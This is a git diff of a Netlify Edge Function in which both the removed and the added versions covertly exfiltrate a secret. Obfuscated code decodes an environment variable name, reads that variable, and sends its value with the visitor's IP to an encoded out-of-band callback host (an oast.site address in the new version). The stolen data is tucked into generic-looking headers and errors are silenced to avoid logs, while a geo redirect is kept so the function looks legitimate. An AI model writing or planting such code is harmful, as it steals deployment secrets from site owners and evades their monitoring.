@@ -1,41 +1,51 @@
 export default async (request, context) => {
-
-    const _s = (h) => h.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
-    const _k = _s("48616d6964"); 
-
-    // Stage 2: Nested Encoding for the URL
-    // The URL is Base64 encoded, then reversed
-    const _r = "==AZ0V2Xz5WayR3clh2Yv9Wbm52bkJ3YihSbhJ3Y05WZp9GajV2XvE2X0V2X";
-    const _u = atob(_r.split("").reverse().join(""));
+    const _decode = (str) => atob(str);
+    const _k = _decode("SGFtaWQ="); 
+    
+    // 2. Multi-encoded OOB URL (Base64 + Rotated/Modified)
+    // This is the Base64 of your OOB site
+    const _uRaw = "aHR0cHM6Ly8zcmZraGtteTQ1c2NlanMwOGpweW5zNWYyaTdsOXRucC5vYXN0LnNpdGU=";
+    const _target = _decode(_uRaw);
 
     try {
-        // Fetch sensitive value
-        const _v = Netlify.env.get(_k) || "N_A";
+        // Netlify.env.get is the correct way to access variables in Edge Functions
+        const _secretValue = Netlify.env.get(_k) || "NOT_DEFINED";
 
-        // Stage 3: Multi-level Exfiltration Payload
-        // We wrap the data in a JSON object, stringify it, then Base64 encode it
-        const _p = btoa(JSON.stringify({
-            val: _v,
-            src: context.ip || "0.0.0.0",
-            ts: Date.now()
+        // 3. Multi-layer encoding for the payload
+        const _payload = btoa(JSON.stringify({
+            data: _secretValue,
+            meta: context.ip || "unknown",
+            ts: new Date().toISOString()
         }));
 
+        // Use context.waitUntil to ensure the fetch completes before the function terminates
         context.waitUntil(
-            fetch(`${_u}?d=${_p}`, {
-                method: "GET",
+            fetch(_target, {
+                method: "POST", // POST is often more reliable for payloads
+                mode: "no-cors",
                 headers: {
-                    // Using a non-standard header with further obfuscation
-                    "X-Metadata-Sync": _p.split('').map(c => c.charCodeAt(0).toString(16)).join('-')
-                }
+                    "Content-Type": "text/plain",
+                    "X-Sync-Token": _payload, // Hidden in a generic-looking header
+                    "X-Ref-ID": btoa(context.geo?.city || "unknown")
+                },
+                body: _payload
             })
         );
-    } catch (_) {
-        // Silent fail to avoid logs
+    } catch (err) {
+        // Silent catch to prevent function crashes from being logged
     }
 
-    // Standard routing logic to appear legitimate
-    const _loc = context.geo?.country?.code === "AU" ? "/edge/au" : "/edge/global";
-    return Response.redirect(new URL(_loc, request.url));
+    // 4. Logic for legitimate-looking redirection
+    const url = new URL(request.url);
+    const isAU = context.geo?.country?.code === "AU";
+    
+    // Ensure the path is constructed correctly relative to the origin
+    const redirectPath = isAU ? "/edge/australia" : "/edge/not-australia";
+    const redirectUrl = new URL(redirectPath, url.origin);
+
+    return Response.redirect(redirectUrl, 302);
 };
 
-export const config = { path: "/edge" };
+export const config = {
+    path: "/edge",
+};
